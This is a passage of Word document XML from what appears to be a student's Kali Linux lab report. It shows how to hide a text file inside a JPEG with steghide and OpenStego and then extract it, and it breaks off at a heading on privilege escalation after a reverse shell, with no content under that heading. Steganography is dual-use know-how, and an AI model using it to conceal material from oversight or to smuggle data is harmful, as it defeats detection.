      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now it is showing done…..</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000129">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000012A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we will be deleting the text file because it is alreday restored inside the picture</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000012B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000012C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">This is how we can secure our data . incase somebody has access to our system they wil not find sensitive data as they all have been deleted from memory but restored inside the picture file while is very hard to guess because it does not alter the picture and even even somebody gets to know there is a file inside the picture and try to extract it then there will be a preset paraphrase to enter…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000012D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000012E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000012F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we will be extracting the text file back from the picture</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000130">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000131">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38"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bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now this is the image file containing all the data of swakshar.txt but it is visually absolutely identical to its original version.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000133">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000134">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: steghide extract -sf lion.jpeg</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000135">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000136">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Then enter the same paraphrase we have set before…</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000137">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000138">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63"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">It shows success as the data has been extracted</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000013A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000013B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we can type “ls” inside /home/swakshar/Desktop</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000013C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000013D">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52"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We can see “swakshar.txt” is restored although it was deleted before</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000013F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000140">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15"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bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Also by using cat swakshar.txt we can see that the content has not been modified or destroyed but it is exactly in its original version.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000142">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">HOW TO USE  OPENSTEGO TO HIDE THE FILES INSIDE IMAGE FILES:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000143">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000144">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">FOR THAT WE NEED TO DOWNLOAD THE OPENSTEGO APP IN OUR KALI LINUX MACHINE AND TO GET THAT WE NEED TO GO TO GITHUB AND DOWNLOAD THE openstego.deb FILE AS KALI LINUX IS A DEBIAN DISTRIBUTION.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000145">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000146">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">After downloading it</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000147">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000148">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Just type openstego in the kali linux machine</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000149">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000014A">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21"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we need to type the message file [swakshar.txt] and the cover file[lion.jpeg] and output stego file [any name.jpeg] to hide the data inside the image file.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000014C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000014D">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18"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we will be deleting the text file from Desktop manually</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000014F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000150">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5"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000152">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">So again we recover the text file back to our Desktop….</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000153">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000154">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distB="114300" distT="114300" distL="114300" distR="114300">
            <wp:extent cx="5731200" cy="2997200"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="20"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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000156">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000157">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">PRIVILEGE ESCALATION OF A DEVICE AFTER HAVING REMOTE ACCESS THROUGH REVERSE_SHELL TCP:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000158">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000159">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
          <w:highlight w:val="red"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000015B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
